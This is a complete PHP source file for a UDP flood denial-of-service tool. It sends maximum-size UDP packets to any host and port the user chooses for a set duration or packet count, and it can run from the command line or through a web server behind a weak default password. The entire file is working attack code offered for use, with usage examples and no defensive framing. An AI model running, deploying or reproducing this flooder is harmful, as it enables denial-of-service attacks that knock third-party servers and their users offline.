<?php


// Current version
define('DOS_VERSION',				'1.0' );
// MD5 Password to be used when the script is executed from the webserver, default is "apple"
define('DOS_PASSWORD',				'1f3870be274f6c49b3e31a0c6728957f' );
// Script max execution time
define('DOS_MAX_EXECUTION_TIME',0);
// Default and max packets size
define('DOS_DEFAULT_PACKET_SIZE',	65000 );
define('DOS_MAX_PACKET_SIZE',		65000 );
// Default byte to send
define('DOS_DEFAULT_BYTE',"\x00");
// Loggin functions
define('DOS_LOG_DEBUG',			4 );
define('DOS_LOG_INFO',				3 );
define('DOS_LOG_NOTICE',			2 );
define('DOS_LOG_WARNING',			1 );
define('DOS_LOG_ERROR',			0 );
// Output formats
define('DOS_OUTPUT_FORMAT_JSON',	'json' );
define('DOS_OUTPUT_FORMAT_TEXT',	'text' );
define('DOS_OUTPUT_FORMAT_XML',	'xml' );
// Output status
define('DOS_OUTPUT_STATUS_ERROR',	'error' );
define('DOS_OUTPUT_STATUS_SUCCESS','success' );


class DoS {

	/**
	 * Default parameters
	 * @var array
	 */
	private $params = array(
			'host' => 	'',
			'port' => 	'',
			'packet' => '',
			'time'	=> 	'',
			'pass'	=> 	'',
			'bytes' =>	'',
			'verbose'=> DOS_LOG_INFO,
			'format'=> 'text',
			'output'=> ''
	);


	
	private $log_labels = array(
			DOS_LOG_DEBUG => 'debug',
			DOS_LOG_INFO => 'info',
			DOS_LOG_NOTICE => 'notice',
			DOS_LOG_WARNING => 'warning',
			DOS_LOG_ERROR => 'error'
	);


	
	private $content_type = "";


	
	private $output = array();


	
	public function __construct($params = array()) {

		ob_start();

		ini_set('max_execution_time',DOS_MAX_EXECUTION_TIME);

		$this->set_params($params);

		$this->set_content_type();

		$this->signature();
		if(isset($this->params['help'])) {
			$this->usage();
			exit;
		}

		$this->validate_params();

		$this->attack();

		$this->print_output();

		ob_end_flush();
	}


	
	public function signature() {
		if(DOS_OUTPUT_FORMAT_TEXT == $this->get_param('format')) {
			$this->println('DoS UDP Flood script');
			$this->println('version '.DOS_VERSION);
			$this->println();
		}
	}


	public function usage() {
		$this->println("EXAMPLES:");
		$this->println("from terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER bytes=NUMBER");
		$this->println("from webserver: http://localhost/dos.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
		$this->println();
		$this->println("PARAMETERS:");
		$this->println("help	Shows this help page");
		$this->println("host	State IP or HOSTNAME");
		$this->println("pass	Only if used from webserver default password is apple ");
		$this->println("port    If not give a random port will be chosen");
		$this->println("time	Time in second to keep the DoS attack on");
		$this->println("packet	Number of packets");
		$this->println("bytes	Size of packet, defualt: ".DOS_DEFAULT_PACKET_SIZE);
		$this->println("format	Output format, (text,json,xml), default: text");
		$this->println("output	Logfile, write and save output to a file");
		$this->println("verbose	OPTIONAL 0: debug, 1:info, 2:notice, 3:warning, 4:error, default: info");
		$this->println();
		$this->println("READ: 	If both time and packet are specified, only time will be used");
		$this->println();
		$this->println("For more information on https://github.com/IbrahimBen0");
		$this->println();
	}



	private function attack(){

		$packets = 0;
		$message = str_repeat(DOS_DEFAULT_BYTE, $this->get_param('bytes'));

		$this->log('Dos UDP flood started');

		
		if($this->get_param('time')) {

			$exec_time = $this->get_param('time');
			$max_time = time() + $exec_time;

			while(time() < $max_time){
				$packets++;
				$this->log('Sending packet #'.$packets,DOS_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
			}
			$timeStr = $exec_time. ' second';
			if(1 != $exec_time) {
				$timeStr .= 's';
			}
		}
		
		else {
			$max_packet = $this->get_param('packet');
			$start_time=time();

			while($packets < $max_packet){
				$packets++;
				$this->log('Sending packet #'.$packets,DOS_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
			}
			$exec_time = time() - $start_time;

			if($exec_time <= 1){
				$exec_time=1;
				$timeStr = 'about a second';
			}
			else {
				$timeStr = 'about ' . $exec_time . ' seconds';
			}
		}

		$this->log("DoS UDP flood completed");

		$data = $this->params;

		unset($data['pass']);
		unset($data['packet']);
		unset($data['time']);

		$data['port'] = 0 == $data['port'] ? 'Radom ports' : $data['port'];
		$data['total_packets'] = $packets;
		$data['total_size'] = $this->format_bytes($packets*$data['bytes']);
		$data['duration'] = $timeStr;
		$data['average'] = round($packets/$exec_time, 2);

		$this->set_output('UDP flood completed', DOS_OUTPUT_STATUS_SUCCESS,$data);

		$this->print_output();

		exit;
	}


	private function udp_connect($h,$p,$out){

		if(0 == $p) {
			$p = rand(1,rand(1,65535));
		}
		$this->log("Trying to open socket udp://$h:$p",DOS_LOG_DEBUG);
		$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);

		if(!$fp) {
			$this->log("UDP socket error: $errstr ($errno)",DOS_LOG_DEBUG);
			$ret = false;
		}
		else {
			$this->log("Socket opened with $h on port $p",DOS_LOG_DEBUG);
			if(!@fwrite($fp, $out)) {
				$this->log("Error during sending data",DOS_LOG_ERROR);
			}
			else {
				$this->log("Data sent successfully",DOS_LOG_DEBUG);
			}
			@fclose($fp);
			$ret = true;
			$this->log("Closing socket udp://$h:$p",DOS_LOG_DEBUG);
		}

		return $ret;
	}




	private function set_params($params = array()) {

		$original_params = array_keys($this->params);
		$original_params[] = 'help';

		foreach($params as $key => $value) {
			if(!in_array($key, $original_params)) {
				$this->set_output("Unknown param $key", DOS_OUTPUT_STATUS_ERROR);
				$this->print_output();
				exit(1);
			}
			$this->set_param($key, $value);
		}
	}

	private function validate_params() {

		// Password for web users
		if(!$this->is_cli() && md5($this->get_param('pass')) !== DOS_PASSWORD) {
			$this->set_output("Wrong password", DOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		elseif(!$this->is_cli()) {
			$this->log('Password accepted');
		}

		if(!$this->is_valid_target($this->get_param('host'))) {
			$this->set_output("Invalid host", DOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			$this->log("Setting host to " . $this->get_param('host'));
		}
		if("" != $this->get_param('port') && !$this->is_valid_port($this->get_param('port'))) {
			$this->log("Invalid port", DOS_LOG_WARNING);
			$this->log("Setting port to random",DOS_LOG_NOTICE);
			$this->set_param('port', 0);
		}
		else {
			$this->log("Setting port to ".$this->get_param('port'));
		}

		if(is_numeric($this->get_param('bytes')) && 0 < $this->get_param('bytes')) {
			if(DOS_MAX_PACKET_SIZE < $this->get_param('bytes')) {
				$this->log("Packet size exceeds the max size", DOS_LOG_WARNING);
			}
			$this->set_param('bytes',min($this->get_param('bytes'),DOS_MAX_PACKET_SIZE));
			$this->log("Setting packet size to ". $this->format_bytes($this->get_param('bytes')));
		}
		else {
			$this->log("Setting packet size to ".$this->format_bytes(DOS_DEFAULT_PACKET_SIZE),DOS_LOG_NOTICE);
			$this->set_param('bytes',DOS_DEFAULT_PACKET_SIZE);
		}

		if(!is_numeric($this->get_param('time')) && !is_numeric($this->get_param('packet'))) {
			$this->set_output("Missing parameter time or packet", DOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			// Just to be sure that users does not submit a wrong time "example: a,-1" and correct packet
			$this->set_param('time', abs(intval($this->get_param('time'))));
			$this->set_param('packet', abs(intval($this->get_param('packet'))));
		}

		if('' != $this->get_param('output')) {
			$this->log("Setting log file to " .$this->get_param('output'),DOS_LOG_INFO);
		}

	}


	
	public function get_param($param) {
		return isset($this->params[$param]) ? $this->params[$param] : null;
	}


	private function set_param($param,$value) {

		$this->params[$param] = $value;
	}

	
	private function set_content_type() {

		if($this->is_cli()) {
			return;
		}

		switch($this->get_param('output')) {
			case DOS_OUTPUT_FORMAT_JSON : {
				$this->content_type = "application/json; charset=utf-8;";
				break;
			}
			case DOS_OUTPUT_FORMAT_XML : {
				$this->content_type = "application/xml; charset=utf-8;";
				break;
			}
			default : {
				$this->content_type = "text/plain; charset=utf-8;";
 				break;
			}
		}

		header("Content-Type: ". $this->content_type);
		$this->log('Setting Content-Type header to ' . $this->content_type, DOS_LOG_DEBUG);
	}


	
	public static function is_cli() {
		return php_sapi_name() == 'cli';
	}

	
	public function get_random_port() {
		return rand(1,65535);
	}



	function is_valid_port($port = 0){
		return ($port >= 1 &&  $port <= 65535) ? $port : 0;
	}


	
	function is_valid_target($target) {
		return 	(	//valid chars check
				preg_match("/^([a-z\d](-*[a-z\d])*)(\.([a-z\d](-*[a-z\d])*))*$/i", $target)
				//overall length check
				&& 	preg_match("/^.{1,253}$/", $target)
				// Validate each label
				&& 	preg_match("/^[^\.]{1,63}(\.[^\.]{1,63})*$/", $target)
		)
		||	filter_var($target, FILTER_VALIDATE_IP);
	}


	
	function format_bytes($bytes, $dec = 2) {
		// exaggerating :)
		$size   = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
		$factor = floor((strlen($bytes) - 1) / 3);
		return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
	}


	
	private function set_output($message, $code, $data = null) {

		$this->output= array("status" =>$code,"message" => $message);
		if(null != $data) {
			$this->output['data'] = $data;
		}
	}

	
	private function print_output() {
		switch($this->get_param('format')) {
			case DOS_OUTPUT_FORMAT_JSON: {
				echo json_encode($this->output);
				break;
			}

			case DOS_OUTPUT_FORMAT_XML: {
				$xml = new SimpleXMLElement('<root/>');
				array_walk_recursive($this->output, function($value, $key)use($xml){
					$xml->addChild($key, $value);
				});
				print $xml->asXML();
				break;
			}

			default: {
				$this->println();
				array_walk_recursive($this->output, function($value, $key) {
					$this->println($key .': ' . $value);
				});
			}
		}
	}

	
	private function log($message,$code = DOS_LOG_INFO) {
		if($code <= $this->get_param('verbose') && $this->get_param('format') == DOS_OUTPUT_FORMAT_TEXT) {
			$this->println('['.$this->log_labels[$code] . '] ' . $message);
		}
	}

	
	private function log_to_file($message) {
		if('' != $this->get_param('output')) {
			file_put_contents($this->get_param('output'), $message, FILE_APPEND | LOCK_EX);
		}
	}


	
	private function println($message = '') {
		echo $message . "\n";
		$this->log_to_file($message . "\n");
		ob_flush();
		flush();
	}
}
$params = array();
if(DoS::is_cli()) {
	global $argv;
	parse_str(implode('&', array_slice($argv, 1)), $params);
}
elseif(!empty($_POST)) {
	foreach($_POST as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
	}
}
elseif(!empty($_GET['host'])) {
	foreach($_GET as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
	}
}
$dos = new DoS($params);
